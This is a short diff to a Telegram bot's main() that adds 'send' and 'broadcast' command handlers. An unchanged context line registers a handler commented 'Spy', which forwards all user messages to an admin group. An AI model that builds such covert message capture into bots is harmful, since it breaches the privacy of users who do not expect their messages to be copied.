@@ -162,7 +162,8 @@ def main() -> None:
     app.add_handler(CommandHandler("stats", cmd_stats))
     app.add_handler(CommandHandler("jobs", cmd_jobs))
     app.add_handler(CommandHandler("canceljob", cmd_canceljob))
-
+    app.add_handler(CommandHandler("send", cmd_send))
+    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
     # Spy: forward ALL user messages to admin group (group 99 runs after everything)
     app.add_handler(MessageHandler(filters.ALL, spy_all), group=99)
 
